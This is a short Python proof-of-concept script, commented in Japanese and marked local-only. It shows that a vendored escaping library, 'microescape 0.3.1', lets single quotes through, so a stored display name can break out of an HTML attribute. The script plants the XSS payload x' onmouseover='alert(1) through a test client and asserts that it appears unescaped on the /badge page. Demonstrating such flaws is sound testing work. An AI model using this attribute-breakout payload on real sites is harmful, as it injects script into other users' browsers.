# ローカル限定PoC: vendored microescape 0.3.1 が引用符を素通しするため属性コンテキストでXSS
import app as A
c = A.app.test_client()
# 単一引用符を含むペイロードを表示名に保存
payload = "x' onmouseover='alert(1)"
c.post("/profile", json={"name": payload})
html = c.get("/badge").get_data(as_text=True)
print("[info] rendered:", html)
# & < > は無いが単一引用符は素通しされ、属性を抜け出してイベントハンドラが注入される
assert "onmouseover='alert(1)" in html and "&#x27;" not in html and "&#39;" not in html
print("[PASS] single quote survived escape() and broke out of the single-quoted attribute (vendored-dep obscure behavior)")
